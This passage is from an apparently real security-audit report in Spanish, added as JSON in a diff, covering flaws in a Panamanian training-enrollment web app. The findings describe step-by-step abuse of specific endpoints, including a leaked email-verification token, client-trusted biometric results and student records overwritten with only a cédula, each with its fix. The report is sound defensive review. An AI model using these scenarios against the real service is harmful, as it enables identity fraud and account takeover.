+     "verificacion": "Parcialmente cierto. BlogEditor.tsx:648 filtra con getAllowedStatesForRole(userRole), sin tener en cuenta el estado actual ni getNextBlogStates, así que un rol 3 ve opciones que reciben 400. Es falso que no quede registrado quién hizo el cambio: el UPDATE pone aprobado_por=adminId y el trigger lo guarda como cambiado_por en historial_estados. El override de admin es intencionado. Solo es un problema de UX. Corrección: filtrar por getNextBlogStates(estado) ∩ rol y marcar los overrides de admin."
+    },
+    {
+     "titulo": "La API pública del blog expone el correo institucional del autor",
+     "severidad": "baja",
+     "archivo": "lib/blogPublic.ts",
+     "linea": 37,
+     "escenario": "getPublishedBlog selecciona `u.correo as autor_email`, y GET /api/blog/{id} (público, sin autenticación) lo devuelve tal cual. Cualquiera puede enumerar los ids y obtener los correos de los administradores (útil para phishing contra cuentas de Azure AD). La página de detalle no lo usa.",
+     "correccion": "Quitar autor_email de la consulta y de la interfaz PublishedBlog.",
+     "verificacion": "Confirmado. lib/blogPublic.ts:37 selecciona u.correo as autor_email, y GET /api/blog/[id] (público) devuelve el objeto completo. Solo afecta a blogs publicados y son correos institucionales, por eso se baja a baja. Corrección: quitar autor_email de la consulta pública."
+    },
+    {
+     "titulo": "Eventos: no se comprueba que fecha_fin sea posterior a fecha_inicio y la hora se guarda sin zona horaria",
+     "severidad": "baja",
+     "archivo": "app/api/admin/eventos/[id]/route.ts",
+     "linea": 144,
+     "escenario": "Ni POST (app/api/admin/eventos/route.ts:109-110) ni PUT validan las fechas. Si un admin pone fin=10/12 08:00 e inicio=12/12 09:00, EventoCard (línea 31) calcula `now > fin` y el evento sale como «pasado» aunque no haya empezado. Además, el valor de datetime-local ('2026-12-10T09:00', sin offset) se guarda en una columna timestamptz usando la zona de la sesión de Postgres. Si el servidor de BD está en UTC, el evento se publica a las 04:00 hora de Panamá. Al editar, toDateTimeLocalInput lo convierte a hora local y, si se guarda sin cambios, se resta otra vez 5 h en cada guardado.",
+     "correccion": "En el cliente, enviar `new Date(valorLocal).toISOString()` o añadir '-05:00'. En el servidor, validar que ambas fechas sean ISO válidas y que fin >= inicio, con 400 si no. Opcionalmente, fijar `options: '-c timezone=America/Panama'` en el Pool.",
+     "verificacion": "Solo la validación es real: ni POST (eventos/route.ts:109-110) ni PUT ([id]/route.ts ~144) comprueban fecha_fin >= fecha_inicio, y EventoCard marca 'pasado' si now > fin. La parte de zona horaria y el desplazamiento de 5 h al guardar ya está corregida y documentada (docs/revision-v1-hallazgos.md, punto 6: columnas timestamptz, zona America/Bogota = UTC-5, igual que Panamá; lib/dateInput.ts). Además, el error depende de que el admin introduzca mal los datos. Corrección: validar el orden de las fechas en el servidor y con min en el input."
+    },
+    {
+     "titulo": "Paginación pública sin límites y mensajes internos de error expuestos",
+     "severidad": "baja",
+     "archivo": "app/api/blog/route.ts",
+     "linea": 7,
+     "escenario": "GET /api/blog?page=abc o ?limit=abc produce NaN en LIMIT/OFFSET y un 500. ?limit=1000000 devuelve todos los blogs con su preview en una sola respuesta. /api/eventos acepta offset negativo o NaN (línea 16). Las rutas consultas/[id] (líneas 75, 185 y 231) y eventos/[id] (líneas 64, 191 y 246) devuelven error.message, que filtra detalles del esquema SQL, en lugar de usar safeErrorDetail como el resto.",
+     "correccion": "Usar `Math.min(Math.max(parseInt(x)||1,1),50)` para page y limit, y offset >= 0. Usar safeErrorDetail en todas las rutas.",
+     "verificacion": "Confirmado. app/api/blog/route.ts:7-8 hace parseInt sin validar ni acotar (NaN da un error de pg y 500; no hay tope en limit). app/api/eventos/route.ts:16 tiene offset sin validar (limit sí se acota a 1000, pero puede ser NaN). consultas/[id] (75, 185, 231) y eventos/[id] (64, 191, 246) devuelven error.message. Las rutas que filtran el mensaje son solo de admin, por eso el impacto es bajo. Corrección: acotar con Number.isFinite y clamp, y usar safeErrorDetail."
+    }
+   ],
+   "descartados": []
+  },
+  {
+   "area": "Capacitaciones, sedes, profesores y calendario",
+   "confirmados": [
+    {
+     "titulo": "La API de inscripción devuelve al navegador el token de verificación de correo, así que se puede validar sin abrir el correo",
+     "severidad": "critica",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 386,
+     "escenario": "Un atacante hace POST a /api/capacitaciones/inscribirse/5 con un correo que no es suyo (o de otra persona). La respuesta 200 trae `token`. Luego hace POST a /api/verificacion/validar/{token}. El servidor pone correo_verificado=true (validar/[token]/route.ts:107-112) y crea la inscripción sin que nadie haya abierto el correo. La verificación por correo no protege nada.",
+     "correccion": "No devolver `token` en la respuesta. Para la página de espera, devolver un id de sondeo distinto (opaco, solo de lectura, p. ej. un hash o un uuid aparte) que /api/verificacion/estado acepte y que no sirva en /validar. /validar debe aceptar solo el token que llega en el enlace del correo.",
+     "verificacion": "Confirmado. inscribirse/[capacitacion]/route.ts:386 devuelve `token` en el JSON 200, y la página lo usa (inscribirse/[id]/page.tsx:601, router.push a /verificacion/esperando/${result.token}). POST /api/verificacion/validar/{token} solo pide el token: lo marca como usado, pone correo_verificado=true (validar/[token]/route.ts:107-112) y crea la inscripción (187-207). No se exige nada más del correo, así que la verificación por correo no protege. Corrección: no devolver el token. Para la página de espera, usar un identificador opaco distinto o consultar el estado por estudiante_id con un nonce de sesión."
+    },
+    {
+     "titulo": "El resultado biométrico viene del cliente sin volver a comprobarlo: cualquiera puede aprobarse solo",
+     "severidad": "critica",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 40,
+     "escenario": "El cliente envía `biometria: {valido: true, id_auditoria: \"x\"}` sin haber pasado por el hub. Con eso esBiometricaValida=true y metodoEfectivo='biometrica'. Al validar el token (validar/[token]/route.ts:131-137) la inscripción se crea con estado_inscripcion=1 y biometria_verificada=true, saltándose el estado «Pendiente de validación» que revisa un administrador. También marca biometria_verificada en ciepi.estudiantes (líneas 158-166).",
+     "correccion": "No confiar en el objeto `biometria` del cuerpo. Guardar en el servidor el resultado de /api/biometria/token (tabla o sesión firmada, ligado a la cédula y con expiración) y, en la inscripción, buscarlo por id_auditoria y comprobar que existe, que coincide con la cédula y que no se usó. Si no, tratar la inscripción como manual.",
+     "verificacion": "Confirmado. route.ts:40-42 decide esBiometricaValida solo con `biometria.valido && biometria.id_auditoria` del body. En todo el servidor (lib/biometria.ts no se usa aquí) nada vuelve a consultar el hub. Ese valor se guarda en la metadata del token (349-361), y validar/[token]/route.ts:131-138 crea la inscripción con estado 1 y biometria_verificada=true. También marca biometria_verificada en estudiantes (158-166 y 253-255). Así se salta la identidad y la revisión del admin. Corrección: validar en el servidor el id_auditoria/access_token contra el hub (o guardar el resultado del callback en el servidor) antes de aceptar el método biométrico."
+    },
+    {
+     "titulo": "Basta con id + cédula para sobrescribir correo, nombre y teléfono de cualquier estudiante, sin fecha de nacimiento ni verificación",
+     "severidad": "alta",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 98,
+     "escenario": "El control de cédula + fecha de nacimiento está solo en /api/verificar/[cedula] (PUT), y esta ruta no lo exige. Con un id secuencial y la cédula de la víctima (dato poco secreto), un POST con `estudiante:{id:123, cedula:'8-123-456', correo:'atacante@x.com', nombres:'...'}` ejecuta el UPDATE de las líneas 144-155 ANTES de verificar el correo y sin poner correo_verificado=false. Sumado al hallazgo del token, el atacante deja el correo cambiado y marcado como verificado.",
+     "correccion": "Exigir la prueba del paso de verificación: un token firmado de corta duración emitido por PUT /api/verificar/[cedula] tras comprobar la fecha de nacimiento. No actualizar los datos del estudiante hasta que se valide el correo (guardar los cambios propuestos en el metadata del token y aplicarlos en /validar). Si cambia el correo, poner correo_verificado=false.",
+     "verificacion": "Confirmado. Para un estudiante existente, route.ts:111-120 compara solo la cédula, sin fecha de nacimiento ni Turnstile. Después, 144-155 sobrescribe correo, teléfono, nombres y apellidos antes de cualquier verificación y sin poner correo_verificado=false. Junto con el hallazgo 0, el cambio queda «verificado». Corrección: no actualizar los datos personales hasta validar el token (guardarlos en la metadata y aplicarlos en validar), exigir la fecha de nacimiento o una sesión de /api/verificar, y resetear correo_verificado al cambiar el correo."
+    },
+    {
+     "titulo": "La inscripción pública no tiene Turnstile ni límite de intentos y acepta estudiantes nuevos con cualquier cédula y nombre",
+     "severidad": "alta",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 16,
+     "escenario": "La página envía `x-turnstile-token` (inscribirse/[id]/page.tsx:265), pero esta ruta nunca llama a verifyTurnstileToken. Un script hace miles de POST con cédulas y correos inventados: llena ciepi.estudiantes con registros que no pasaron por el registro nacional (líneas 236-257 insertan lo que mande el cliente) y envía un correo de verificación por petición a cualquier dirección. Eso es spam desde el dominio del INADEH y daña la reputación del remitente.",
+     "correccion": "Verificar Turnstile en el POST como en /api/verificar y /api/mentorias/reservas. Limitar peticiones por IP y por correo. Para alumnos nuevos, volver a consultar lookupCedulaRecord en el servidor y tomar nombre, sexo y fecha de nacimiento de ese registro, no del cuerpo de la petición.",
+     "verificacion": "Confirmado: la ruta no importa ni llama a verifyTurnstileToken, y middleware.ts no limita la frecuencia. Matiz: el header x-turnstile-token de page.tsx:265 se envía a /api/verificar/[cedula], no a esta ruta. Aun así, el POST se puede llamar directamente sin pasar por verificar. Inserta cédula y nombres sin validar (236-257) y envía un correo por petición (371-378); por la vía de estudiante existente se puede reenviar al mismo destino de forma repetida. Corrección: exigir Turnstile o un token firmado emitido por /api/verificar, limitar por IP y por correo, y no aceptar estudiantes nuevos cuyos datos no vengan del registro nacional verificado en el servidor."
+    },
+    {
+     "titulo": "La inscripción cierra a las 00:00 del último día porque se compara una columna DATE con NOW()",
+     "severidad": "alta",
+     "archivo": "app/api/capacitaciones/route.ts",
+     "linea": 59,
+     "escenario": "fecha_final_inscripcion es DATE ('2026-12-01'). El 1 de diciembre a las 10:00, `fecha_final_inscripcion >= NOW()` compara 2026-12-01 00:00 con 10:00 y da falso: la capacitación desaparece del listado público el último día. En la ruta de inscripción (inscribirse/[capacitacion]/route.ts:77-93), node-pg convierte el DATE en medianoche local, así que `now > fechaFinal` rechaza con «El período de inscripción ha finalizado» todo el último día. Si el servidor corre en UTC, cierra a las 19:00 del día anterior (hora de Panamá). Con el servidor en UTC, `new Date(fecha).toLocaleDateString()` en el listado admin (app/admin/capacitaciones/page.tsx:53) y en el detalle público (app/capacitaciones/[id]/page.tsx:81) muestra además un día menos.",
+     "correccion": "Comparar por fecha: `fecha_final_inscripcion >= CURRENT_DATE` (con la zona America/Panama en la sesión de PG) y lo mismo con fecha_inicio. En la ruta de inscripción, hacer la comprobación en SQL o comparar cadenas YYYY-MM-DD en la zona de Panamá. Fijar TZ=America/Panama en el servidor o registrar types.setTypeParser(1082, v => v) para que los DATE lleguen como cadena.",
+     "verificacion": "Confirmado. database/verificar_columnas.sql:45 declara fecha_final_inscripcion como date, y lib/db.ts no define setTypeParser. En SQL, `fecha_final_inscripcion >= NOW()` (api/capacitaciones/route.ts:59) es falso durante todo el último día después de las 00:00. En la ruta de inscripción, node-pg convierte el DATE en medianoche local y `now > fechaFinal` (route.ts:88) rechaza todo el último día. El desfase de un día al mostrarlo solo ocurre si el servidor no está en la zona de Panamá. Corrección: comparar con `>= CURRENT_DATE` en SQL y en JS comparar contra el final del día en America/Panama (o parsear los DATE como string)."
+    },
+    {
+     "titulo": "Editar una capacitación borra sin avisar a los profesores inactivos asignados",
+     "severidad": "media",
+     "archivo": "app/admin/capacitaciones/editar/[id]/page.tsx",
+     "linea": 162,
+     "escenario": "La página de edición carga los datos desde el endpoint PÚBLICO /api/capacitaciones/{id}, que filtra `p.activo = true` (app/api/capacitaciones/[id]/route.ts:69), y ProfesoresSelector solo lista activos. Ejemplo: la capacitación tiene a los profesores A (activo) y B (desactivado temporalmente). El admin cambia solo el nombre y guarda: el PUT hace DELETE de todos los profesores y vuelve a insertar solo [A] (admin/capacitaciones/[id]/route.ts:305-315). B queda desvinculado para siempre, aunque se reactive.",
+     "correccion": "Cargar la edición desde GET /api/admin/capacitaciones/{id}, que ya existe y no filtra por activo. Mostrar en ProfesoresSelector a los profesores seleccionados aunque estén inactivos, con una marca de «inactivo».",
+     "verificacion": "Confirmado. editar/[id]/page.tsx:162 carga desde /api/capacitaciones/{id}, que filtra p.activo=true (api/capacitaciones/[id]/route.ts:69). selectedProfesorIds solo recibe los activos (202-205), ProfesoresSelector pide ?activo=true y el PUT borra y vuelve a insertar (admin/capacitaciones/[id]/route.ts:304-315). Los profesores inactivos se pierden al guardar. Corrección: cargar desde el GET admin sin el filtro de activo, o en el PUT conservar los vínculos con profesores inactivos."
+    },
+    {
+     "titulo": "Crear y editar capacitaciones no usan transacción: un error deja la capacitación sin profesores ni horarios, o la duplica",
+     "severidad": "media",
+     "archivo": "app/api/admin/capacitaciones/[id]/route.ts",
+     "linea": 305,
+     "escenario": "En el PUT se hacen UPDATE, DELETE de profesores, INSERT, DELETE de horarios e INSERT por bloque como consultas sueltas. Si falla un INSERT de horario (p. ej. viola chk_horario_rango, un profesor borrado en otra pestaña da error de FK, o se corta la conexión), el usuario ve un error 500, pero la capacitación ya quedó actualizada y sin profesores ni horarios. En crear (crear/route.ts:171-189) la capacitación se inserta antes que los horarios: si estos fallan, el admin reintenta y aparece duplicada.",
+     "correccion": "Envolver todo (archivos aparte) en withTransaction de lib/db.ts, que ya existe. Insertar los horarios en una sola sentencia con unnest para reducir las idas y vueltas.",
+     "verificacion": "Confirmado que no hay transacción, aunque lib/db.ts exporta withTransaction (línea 38) y no se usa. Matiz: chk_horario_rango no puede fallar, porque parseCapacitacionExtraFields ya filtra fin>inicio. Sí puede fallar el INSERT de profesores por FK (ON CONFLICT DO NOTHING no cubre FK) si un profesor se borró en otra pestaña: la capacitación queda actualizada y sin profesores. En crear, si falla algo después del INSERT, se responde 500 y la capacitación ya existe; al reintentar se duplica. Corrección: envolver UPDATE/INSERT, DELETE e INSERT de relaciones en withTransaction."
+    },
+    {
+     "titulo": "Al guardar la edición se borran los textos antiguos de sede, edificio, salón y horario",
+     "severidad": "media",
+     "archivo": "app/api/admin/capacitaciones/[id]/route.ts",
+     "linea": 263,
+     "escenario": "Los formularios de crear y editar no tienen campos `horario`, `sede`, `edificio` ni `salon`, así que parseCapacitacionExtraFields devuelve null y el UPDATE escribe horario=NULL, sede=NULL, edificio=NULL y salon=NULL. Una capacitación anterior a la parametrización, con sede='Tocumen' en texto y sin sede_id, pierde su ubicación en el detalle público (COALESCE(s.nombre, c.sede)) y en el calendario en cuanto alguien corrige un error de ortografía.",
+     "correccion": "En el PUT, actualizar estas columnas solo si llegan en el FormData (p. ej. `horario = COALESCE($11, horario)` o construir el SET de forma dinámica). Otra opción es migrar los textos a sede_id, edificio_id y aula_id antes de salir a producción.",
+     "verificacion": "Confirmado. Los formularios de crear y editar solo añaden profesorIds, sedeId, edificioId, aulaId y horarios (editar/[id]/page.tsx:258-262). El esquema del formulario no tiene horario, sede, edificio ni salon, así que cleanText devuelve null y el UPDATE (route.ts:263-267) los pone en NULL. Las capacitaciones antiguas con sede en texto y sin sede_id pierden su ubicación, que el detalle muestra con COALESCE. El impacto depende de que haya datos heredados. Corrección: no tocar esas columnas en el UPDATE si no vienen en el formData (COALESCE o un SET dinámico)."
+    },
+    {
+     "titulo": "El detalle público muestra capacitaciones inactivas o cerradas con el botón «Inscríbete Ahora»",
+     "severidad": "media",
+     "archivo": "app/api/capacitaciones/[id]/route.ts",
+     "linea": 77,
+     "escenario": "GET /api/capacitaciones/{id} no filtra por activo ni por fechas, y app/capacitaciones/[id]/page.tsx:450 siempre muestra el botón. Un enlace compartido o indexado a una capacitación desactivada lleva al ciudadano a completar todo el flujo (cédula, fecha de nacimiento, biometría, datos), y solo al final recibe «no está disponible para inscripciones». Además expone capacitaciones que el admin quiso ocultar.",
+     "correccion": "En el endpoint público, devolver 404 si activo=false (el admin ya tiene su propio endpoint). Calcular `inscripcion_abierta` en el servidor y, si es falso, ocultar o deshabilitar el botón y mostrar «Inscripción cerrada» o «Abre el …». Bloquear también la página /capacitaciones/inscribirse/[id] al cargar.",
+     "verificacion": "Confirmado. api/capacitaciones/[id]/route.ts:77 filtra solo por id. El botón de capacitaciones/[id]/page.tsx:446-450 no tiene condición, e inscribirse/[id]/page.tsx:144-152 no comprueba activo ni fechas. El rechazo llega solo en el POST final (route.ts:65-93). Corrección: en la UI, ocultar o deshabilitar el CTA y cortar el flujo si !activo o fuera de fechas. Ojo: la página de edición admin usa este mismo endpoint, así que filtrar en la API la rompería si no se cambia antes a la ruta admin."
+    },
+    {
+     "titulo": "Los bloques horarios no válidos se descartan sin avisar y no se validan los rangos de fechas",
+     "severidad": "media",
+     "archivo": "lib/capacitacionDetails.ts",
+     "linea": 130,
+     "escenario": "El admin pone un bloque Lunes 20:00–18:00 (o deja la hora de fin vacía). El filtro `fin > inicio` lo descarta en silencio, el servidor responde 201 o 200 y aparece «Capacitación actualizada exitosamente», pero el bloque no se guarda y la clase no sale en el calendario. Tampoco se comprueba que fechaFinal >= fechaInicio, ni de inscripción ni de capacitación. Además, el PUT no valida cantidadHoras ni cantidad_participantes (crear sí lo hace), así que admite valores negativos.",
+     "correccion": "Devolver `{ok:false, error:'Bloque N: la hora de fin debe ser posterior a la de inicio'}` en vez de descartar el bloque, y validar lo mismo en UbicacionHorariosSelector antes de enviar. Validar fin >= inicio en ambos pares de fechas y que la inscripción cierre antes o el mismo día que termina la capacitación. Reutilizar en el PUT la validación numérica de crear.",
+     "verificacion": "Confirmado. lib/capacitacionDetails.ts:124-131 descarta en silencio los bloques con fin<=inicio o con hora vacía, y UbicacionHorariosSelector no valida. Ni crear ni el PUT comprueban fechaFinal>=fechaInicio. El PUT (admin/capacitaciones/[id]/route.ts:208-214) no valida el rango de cantidadHoras ni de cantidad_participantes, mientras que crear sí (crear/route.ts, validaciones en torno a cantidadHoras<0 y cantidadParticipantes<1). Solo lo pueden provocar admins. Corrección: devolver 400 con un mensaje cuando haya bloques inválidos o fechas invertidas, y reutilizar las validaciones numéricas de crear."
+    },
+    {
+     "titulo": "Borrar una sede o un profesor elimina en cascada y deja capacitaciones sin ubicación; no existe la opción de desactivar",
+     "severidad": "baja",
+     "archivo": "app/api/admin/sedes/[id]/route.ts",
+     "linea": 216,
+     "escenario": "Por las FK (ON DELETE CASCADE en edificios y aulas, ON DELETE SET NULL en capacitaciones.sede_id, edificio_id y aula_id), DELETE /api/admin/sedes/3 borra todos sus edificios y aulas y deja en NULL la ubicación de todas las capacitaciones que la usaban, incluidas las que están en curso. No se avisa de cuántas había. La página app/admin/sedes no tiene botón de editar ni desactivar (el PUT con `activo` existe, pero la interfaz no lo usa), así que eliminar es la única opción. Igual con DELETE /api/admin/profesores/{id}: borra el vínculo en capacitacion_profesores de todos los cursos.",
+     "correccion": "Antes de borrar, contar las capacitaciones que dependen del registro y responder 409 con ese número si hay alguna, recomendando desactivar. Añadir en la página de sedes el interruptor activo/inactivo (el PUT ya lo admite). Para profesores, preferir activo=false.",
+     "verificacion": "Parcialmente confirmado, con la línea mal: el archivo tiene 102 líneas y el DELETE está en app/api/admin/sedes/[id]/route.ts:81. Las FK con CASCADE y SET NULL existen (create_sedes_edificios_aulas_horarios.sql:12,25,39-41; capacitacion_profesores ON DELETE CASCADE). Sin embargo, sí se avisa: sedes/page.tsx:250 pide «¿Eliminar la sede ... y todos sus edificios/aulas?» y profesores/page.tsx:116 dice «Se desvinculará de las capacitaciones asignadas». Lo que falta es indicar cuántas capacitaciones se ven afectadas y ofrecer desactivar desde la UI. Es una acción confirmada por un admin, por eso baja. Corrección: bloquear el DELETE si hay capacitaciones vigentes (409 con el conteo) y exponer activo=false en la interfaz."
+    },
+    {
+     "titulo": "El endpoint público de inscripción y varios endpoints admin devuelven error.message crudo de PostgreSQL; las subidas no tienen límite de tamaño",
+     "severidad": "baja",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 400,
+     "escenario": "Un POST anónimo con `capacitacion_id: \"abc\"` o un `provincia_id` que no existe responde 500 con `details: 'invalid input syntax for type integer…'` o con el nombre de la constraint o tabla, lo que da pistas del esquema a un atacante. Lo mismo en admin/capacitaciones/[id]/route.ts (GET y PUT, `message: error.message`) y en admin/capacitaciones/[id]/estudiantes/route.ts:215, a diferencia del resto, que usa safeErrorDetail. Además, saveFile (lib/fileUpload.ts:22) lee el archivo entero en memoria sin límite de tamaño ni comprobación de MIME, así que un banner de 500 MB se acepta y se guarda.",
+     "correccion": "Usar safeErrorDetail(error) en todas estas rutas. Validar capacitacion_id como entero positivo antes de consultar. En saveFile, rechazar file.size > N MB (p. ej. 5 MB para banners y 10 MB para adjuntos) y comprobar file.type según la carpeta.",
+     "verificacion": "Confirmado. inscribirse/[capacitacion]/route.ts:400 devuelve error.message en una ruta pública: por ejemplo, capacitacion_id='abc' produce en el SELECT de la línea 49 «invalid input syntax for type integer». También admin/capacitaciones/[id]/route.ts:118,346 y estudiantes/route.ts:215 devuelven el mensaje crudo, mientras que lib/apiError.safeErrorDetail ya existe. saveFile (lib/fileUpload.ts:22) lee todo con arrayBuffer, sin límite de tamaño ni comprobación de MIME; solo valida la extensión. Solo afecta a admins, y el límite de subida ya figura en los pendientes. Corrección: usar safeErrorDetail y comprobar file.size y el tipo antes de leer."
+    }
+   ],
+   "descartados": []
+  },
+  {
+   "area": "Base de datos y consultas SQL",
+   "confirmados": [
+    {
+     "titulo": "El servidor confía en el resultado biométrico enviado por el navegador (se guarda como verificado sin validarlo)",
+     "severidad": "alta",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 40,
+     "escenario": "Un atacante hace POST a /api/capacitaciones/inscribirse/X con body.biometria = {valido:true, id_auditoria:\"falso\", estado:\"APROBADO\"}. esBiometricaValida pasa a true y el objeto se copia tal cual en la metadata del token. Al validar el correo (verificacion/validar/[token]/route.ts:188-205) la inscripción se crea con biometria_verificada=true y estado 1 (NUEVA), en lugar de 6 (Pendiente de validación). Así se salta la validación manual y queda en la BD una auditoría biométrica falsa. Tampoco se compara biometria.cedula con estudiante.cedula. app/api/biometria/token no guarda nada del lado del servidor que permita contrastarlo.",
+     "correccion": "Hacer el intercambio OAuth/PKCE (o la consulta del id_auditoria al hub) en el servidor y guardar el resultado en el servidor (tabla o cookie firmada) asociado a la cédula. En inscribirse, ignorar body.biometria y usar solo el resultado verificado por el servidor cuya cédula coincida con la del estudiante.",
+     "verificacion": "Confirmado. inscribirse/[capacitacion]/route.ts:40-42 solo comprueba que biometria.valido e id_auditoria sean verdaderos en el body del cliente. Luego copia el objeto a la metadata del token (l.~345-355). validar/[token]/route.ts:131-138 y 187-206 crean la inscripción con estado 1 y biometria_verificada=true. /api/biometria/token solo hace de proxy hacia el Hub y no guarda nada del lado del servidor, y no se compara la cédula. La bajo a alta: el atacante sigue necesitando verificar un correo que controla, y el admin todavía tiene que mover la inscripción de 1 a 3. Pero se salta el control de identidad y queda una auditoría falsa en la BD. Corrección: canjear o verificar id_auditoria contra el Hub en el servidor (o firmar el resultado en /api/biometria/token y guardarlo) y comparar la cédula."
+    },
+    {
+     "titulo": "El token de verificación se marca como usado antes de crear la inscripción y sin transacción: si algo falla, la inscripción se pierde",
+     "severidad": "media",
+     "archivo": "app/api/verificacion/validar/[token]/route.ts",
+     "linea": 87,
+     "escenario": "El estudiante hace clic en el enlace. markTokenAsUsed (l.87) hace commit de usado=true. Luego falla un paso posterior: getPendienteValidacionEstadoId, el SELECT de la capacitación o el INSERT de ciepi.inscripciones (l.188), por ejemplo por una FK, un 23505 por doble clic o un corte del pool. El usuario recibe un 500 y, al reintentar, ve «Este enlace ya fue usado». No queda ninguna inscripción y el token no se puede reutilizar. Además, invalidatePreviousTokens ya mató los demás.",
+     "correccion": "Envolver en withTransaction: UPDATE verificacion_correo ... WHERE token=$1 AND usado=false RETURNING (dentro de la transacción), UPDATE de estudiantes y INSERT de inscripciones ... ON CONFLICT (id_usuario,id_capacitacion) DO UPDATE/NOTHING. Hacer COMMIT solo al final. Crear el índice único (id_usuario, id_capacitacion) si no existe.",
+     "verificacion": "markTokenAsUsed (l.87) hace commit antes del UPDATE de estudiantes, getPendienteValidacionEstadoId, el SELECT y el INSERT (l.107-207). Todo va sin withTransaction, aunque lib/db.ts ya la tiene. Si un paso posterior falla, el token queda usado y no hay inscripción. La parte del 23505 por doble clic no se sostiene: el UPDATE ... WHERE usado=false es atómico, así que el segundo clic recibe «ya usado» y no llega al INSERT. Además, el usuario puede volver a inscribirse porque no existe la inscripción. Por eso es media y no alta. Corrección: meter el marcado del token y el INSERT en withTransaction."
+    },
+    {
+     "titulo": "La fecha final de inscripción (DATE) se compara con NOW(): la capacitación desaparece y se rechaza el mismo último día",
+     "severidad": "alta",
+     "archivo": "app/api/capacitaciones/route.ts",
+     "linea": 59,
+     "escenario": "fecha_final_inscripcion = 2026-11-30 (tipo date). El 30/11 a las 08:00, `fecha_final_inscripcion >= NOW()` compara 2026-11-30 00:00 con 2026-11-30 08:00 y da false: la capacitación sale del listado público durante todo su último día. Si la sesión de la BD está en UTC, desaparece desde las 19:00 del día anterior en Panamá. Lo mismo pasa en inscribirse/[capacitacion]/route.ts:77-88: node-pg convierte el DATE en medianoche local, `now > fechaFinal` es true y se responde «El período de inscripción ha finalizado» el último día.",
+     "correccion": "En SQL: `fecha_final_inscripcion >= (NOW() AT TIME ZONE 'America/Panama')::date`. En inscribirse, comparar fechas de calendario (YYYY-MM-DD en America/Panama) o hacer la comprobación en SQL con la misma expresión, y aplicarla también a fecha_inicio_inscripcion.",
+     "verificacion": "Confirmado. verificar_columnas.sql:45 muestra que fecha_final_inscripcion es de tipo date. capacitaciones/route.ts:58-60 usa `fecha_final_inscripcion >= NOW()`: la fecha se convierte en medianoche y deja fuera todo el último día. En inscribirse/route.ts:77-93, new Date() sobre un DATE (node-pg lo interpreta como medianoche local) hace que `now > fechaFinal` sea true el último día. Corrección: comparar con `>= CURRENT_DATE` y, en Node, con el fin del día (o hacer la comprobación en SQL)."
+    },
+    {
+     "titulo": "Cambio de estado de inscripción con lectura y escritura separadas (TOCTOU): la máquina de estados se puede saltar",
+     "severidad": "baja",
+     "archivo": "app/api/admin/inscripciones/[id]/route.ts",
+     "linea": 95,
+     "escenario": "Dos administradores abren la inscripción en estado 1 (NUEVA). A la pasa a 3 (MATRICULADO). B, con la lectura vieja (estado 1), la pasa a 2 (RECHAZADO): la validación se hace con el estado 1, así que se permite, y el UPDATE ... WHERE id=$2 sobrescribe. Resultado: la transición 3→2, que el grafo no permite, sin override y sin registro. Además nunca se escriben actualizado_por ni fecha_ultima_actualizacion (ningún script crea un trigger), así que no hay auditoría de quién hizo el cambio.",
+     "correccion": "`UPDATE ciepi.inscripciones SET estado_inscripcion=$1, actualizado_por=$3, fecha_ultima_actualizacion=NOW() WHERE id=$2 AND estado_inscripcion=$4 RETURNING ...` y devolver 409 si rowCount=0, igual que ya hace mentorias/reservas/[id].",
+     "verificacion": "El escenario de la «lectura vieja» del navegador es falso: el servidor vuelve a leer el estado en cada petición (l.46-58) y valida contra el estado actual. Si A ya puso 3, la petición de B se valida como 3→2 y se rechaza. Solo queda una carrera real entre dos peticiones simultáneas por milisegundos, porque el UPDATE (l.95-100) no lleva `AND estado_inscripcion = $current`. También es cierto que no se escriben actualizado_por ni fecha_ultima_actualizacion (no hay triggers en database/). Corrección: añadir `AND estado_inscripcion = $3` y responder 409 si no se actualiza ninguna fila, y además guardar actualizado_por."
+    },
+    {
+     "titulo": "Blog: el cambio de estado no está condicionado al estado leído y el comentario temporal queda huérfano",
+     "severidad": "baja",
+     "archivo": "app/api/admin/blog/[id]/route.ts",
+     "linea": 192,
+     "escenario": "(a) Dos revisores aprueban o rechazan a la vez desde el estado 2. Ambos pasan validateBlogStateTransition y el segundo UPDATE (l.269, WHERE id=$n) pisa al primero (por ejemplo, 4→3), con un salto de etapa no permitido. (b) Si se envía estado igual al actual junto con comentario_temp, set_comentario_estado guarda el comentario (l.193), pero el trigger no se dispara porque OLD.estado = NEW.estado. El comentario queda en temp_blog_comentarios y aparece en el historial del siguiente cambio de estado, quizá hecho por otra persona. También queda si el UPDATE falla. Además, `estado !== currentBlog.estado` compara un string con un número.",
+     "correccion": "Hacer set_comentario_estado y el UPDATE en una sola withTransaction, solo cuando Number(estado) !== currentBlog.estado, con `WHERE id=$n AND estado=$actual` y 409 si rowCount=0. Mejor aún: pasar el comentario con SET LOCAL de una variable de sesión (set_config('ciepi.comentario', $1, true)) en lugar de una tabla global.",
+     "verificacion": "(a) La carrera solo ocurre con peticiones simultáneas, porque el estado se vuelve a leer en cada petición. El UPDATE (l.251-254) no lleva WHERE estado. (b) Confirmado: set_comentario_estado (l.192-197) se ejecuta antes del UPDATE y sin transacción. Si estado es igual al actual, o si updates queda vacío (400) o falla, el comentario queda en temp_blog_comentarios. El trigger (create_blogs_table.sql:57-80) lo recoge en el siguiente cambio de estado. La línea 228 compara `estado !== currentBlog.estado` sin Number(): con un string igual al estado actual se escribe el mismo estado y se pisa aprobado_por. Corrección: usar targetEstado en la l.228, llamar a set_comentario_estado solo si hay cambio y meterlo todo en una transacción con `AND estado = $current`."
+    },
+    {
+     "titulo": "create_blogs_table.sql no coincide con el esquema real y no se puede volver a ejecutar; la función de comentarios usa una tabla sin esquema",
+     "severidad": "baja",
+     "archivo": "database/create_blogs_table.sql",
+     "linea": 41,
